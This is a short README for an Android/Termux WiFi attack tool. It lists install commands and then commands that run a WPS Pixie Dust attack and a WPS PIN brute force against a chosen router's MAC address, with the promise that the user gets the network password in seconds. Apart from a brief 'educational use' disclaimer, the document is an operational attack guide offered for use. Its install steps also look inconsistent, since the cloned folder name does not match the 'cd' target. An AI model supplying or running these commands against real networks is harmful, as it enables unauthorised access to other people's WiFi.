# Panda WIFI TOOL by Mr IQBAL ⚡💀

Mr Iqbal WiFi tool – **Use Only for educational & Learning Purposes**  
Pixie Dust attack can fetch Password from vulnerable routers in 5_10 seconds.

**Dont use it Illegal!- As it is against law**

## Requirements
- Rooted Android phone
- Termux app installed

## Installation
- Add All commands one by one.

```bash
apt update && apt upgrade -y
```
```bash
pkg install -y root-repo
```
```bash
pkg install -y git tsu python wpa-supplicant pixiewps iw
```
```bash
git clone https://github.com/pandajee25/MrIqbal_wifitool
```
```bash
cd panda
```
```bash
chmod +x panda.py
```
```bash
sudo python panda.py --help
```
- Now make sure your Wifi should be off
# Run Pixi Dust Attack
```bash
sudo python panda.py -i wlan0 -K
```
- Select Green colored Network and boom 💥, You will get password 🔑.
- Enjoy 😍

## Extra Attack code (Brute Force)
```bash
sudo python panda.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B -p 1234
```
- Replace AA:BB:CC:DD:EE:FF with mac adress.
  
